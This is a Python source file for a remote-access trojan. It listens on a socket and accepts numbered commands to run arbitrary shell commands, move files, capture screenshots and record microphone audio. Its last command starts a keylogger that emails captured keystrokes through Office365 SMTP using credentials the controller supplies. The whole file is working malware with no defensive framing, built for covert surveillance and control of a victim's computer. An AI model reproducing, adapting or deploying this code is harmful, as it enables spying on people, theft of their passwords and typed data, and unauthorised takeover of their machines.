import socket
import subprocess
import os
import pyautogui
global name
import base64
import pyaudio
import wave
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
HOST = '127.0.0.1'  # '192.168.43.82'
PORT = 8081  # 2222
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

while True:
    command = client.recv(1024)
    command = command.decode()
    if command == "1":  # remote command excution ---------------------------
        while True:
            print("[-] Awaiting commands...")
            command = client.recv(1024)
            command = command.decode()
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            print("[-] Sending response...")
            client.send(output + output_error)
    elif command == "2":  # upload a file to the server ----------------------
        file_to_download=client.recv(5000)
        file_to_download=file_to_download.decode()
        content = client.recv(5000)
        with open(f"server/{file_to_download}", "wb") as filewrite:
            filewrite.write(content)
        print("done")
    elif command == "3":  # download a file from the server-------------------------------
        files = []
        name = ""
        print("i am before loop")
        for file in os.listdir("./server"):
            files.append(str(file))
            name = name + file + "-"
        print(files)
        print("loop is done")
        name = name.encode()
        client.send(name)
        file_to_upload = client.recv(5000)
        file_to_upload = file_to_upload.decode()
        with open(f"./server/{file_to_upload}", "rb") as readefile:
            info = readefile.read()
        print(info)
        client.send(info)
    elif command=="4":
        screenshot=pyautogui.screenshot()
        screenshot.save(r"./server/screenshot.png")
        with open("./server/screenshot.png","rb") as readimage:
            content=readimage.read()
        encoded_image = base64.b64encode(content).decode('utf-8')
        client.sendall(encoded_image.encode('utf-8'))
    elif command=="5":

        filename = "./server/recorded.wav"
        chunk = 1024
        FORMAT = pyaudio.paInt16
        channels = 1
        sample_rate = 44100
        record_seconds = 5
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        output=True,
                        frames_per_buffer=chunk)
        frames = []
        print("Recording...")
        for i in range(int(sample_rate / chunk * record_seconds)):
            data = stream.read(chunk)
            frames.append(data)
        print("Finished recording.")
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(filename, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(sample_rate)
        wf.writeframes(b"".join(frames))
        wf.close()
        with open("./server/recorded.wav","rb") as readrecored:
            content=readrecored.read()
        client.sendall(content)
        break
    elif command=="6":
        email_aadress=client.recv(2000)
        email_aadress=email_aadress.decode()
        EMAIL_ADDRESS = email_aadress
        password=client.recv(2000)
        password=password.decode()
        EMAIL_PASSWORD=password
        duration=client.recv(2000)
        duration=duration.decode()
        int_duration=int(duration)
        SEND_REPORT_EVERY = int_duration




        class Keylogger:
            def __init__(self, interval, report_method="email"):
                self.interval = interval
                self.report_method = report_method
                self.log = ""
                self.start_dt = datetime.now()
                self.end_dt = datetime.now()

            def callback(self, event):
                """
                This callback is invoked whenever a keyboard event is occured
                (i.e when a key is released in this example)
                """
                name = event.name
                if len(name) > 1:
                    if name == "space":
                        name = " "
                    elif name == "enter":
                        name = "[ENTER]\n"
                    elif name == "decimal":
                        name = "."
                    else:
                        name = name.replace(" ", "_")
                        name = f"[{name.upper()}]"
                self.log += name

            def update_filename(self):
                start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
                end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
                self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

            def report_to_file(self):
                """This method creates a log file in the current directory that contains
                the current keylogs in the `self.log` variable"""
                with open(f"{self.filename}.txt", "w") as f:
                    print(self.log, file=f)
                print(f"[+] Saved {self.filename}.txt")

            def prepare_mail(self, message):
                """Utility function to construct a MIMEMultipart from a text
                It creates an HTML version as well as text version
                to be sent as an email"""
                msg = MIMEMultipart("alternative")
                msg["From"] = EMAIL_ADDRESS
                msg["To"] = EMAIL_ADDRESS
                msg["Subject"] = "Keylogger logs"
                html = f"<p>{message}</p>"
                text_part = MIMEText(message, "plain")
                html_part = MIMEText(html, "html")
                msg.attach(text_part)
                msg.attach(html_part)
                return msg.as_string()

            def sendmail(self, email, password, message, verbose=1):
                server = smtplib.SMTP(host="smtp.office365.com", port=587)
                server.starttls()
                server.login(email, password)
                server.sendmail(email, email, self.prepare_mail(message))
                server.quit()
                if verbose:
                    print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

            def report(self):
                """
                This function gets called every `self.interval`
                It basically sends keylogs and resets `self.log` variable
                """
                if self.log:
                    self.end_dt = datetime.now()
                    self.update_filename()
                    if self.report_method == "email":
                        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                    elif self.report_method == "file":
                        self.report_to_file()
                    print(f"[{self.filename}] - {self.log}")
                    self.start_dt = datetime.now()
                self.log = ""
                timer = Timer(interval=self.interval, function=self.report)
                timer.daemon = True
                timer.start()

            def start(self):
                self.start_dt = datetime.now()
                keyboard.on_release(callback=self.callback)
                self.report()
                print(f"{datetime.now()} - Started keylogger")

                keyboard.wait()
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        keylogger.start()


























